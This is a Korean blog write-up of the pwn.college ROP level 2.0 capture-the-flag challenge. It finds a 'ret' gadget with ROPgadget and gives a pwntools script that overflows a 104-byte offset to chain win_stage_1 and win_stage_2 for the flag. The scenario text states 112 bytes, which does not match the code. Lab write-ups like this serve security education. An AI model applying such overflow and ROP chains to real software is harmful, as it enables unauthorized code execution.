---
title: "[pwn.college] ROP Level2.0 Write up"
author: d0razi
date: 2023-08-07 16:00
categories: [InfoSec, Pwn]
tags: [linux, pwn.college]
toc: false
image: /assets/img/media/banner/pwn-college.png
---

# 문제 분석

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level2.0/Untitled.png)

파일을 실행하면 위와 같이 문장이 출력됩니다. 해석해보면 flag를 얻기 위해서는 `win_stage_1`, `win_stage_2` 두 함수를 순서대로 호출해야 한다고 하네요. 그리고 입력 버퍼와 리턴 주소 오프셋은 104바이트인걸 알려주네요.

익스플로잇 시나리오는 아래와 같습니다.

1. 더미 데이터(112bytes) 채우기
2. 이후에 [`win_stage_1`] + [`ret 가젯`] + [`win_stage_2`] 이런 순서로 데이터 입력

## 가젯 주소 찾기

저는 ROPgadget을 이용하여 주소를 찾았습니다

```bash
ROPgadget --binary /challenge/babyrop_level2.0 | grep ": ret"
```

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level2.0/Untitled%201.png)

가젯 주소 : `0x000000000040101a`

# Exploit code

```python
from pwn import *

p = process("/challenge/babyrop_level2.0")
e = ELF("/challenge/babyrop_level2.0")

ret = 0x000000000040101a

pay = b'A' * 0x60
pay += b'V' * 0x8
pay += p64(e.symbols["win_stage_1"])
pay += p64(ret) + p64(e.symbols["win_stage_2"])
p.sendline(pay)
p.recvuntil(b"Leaving!")
p.interactive()
```

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level2.0/Untitled%202.png)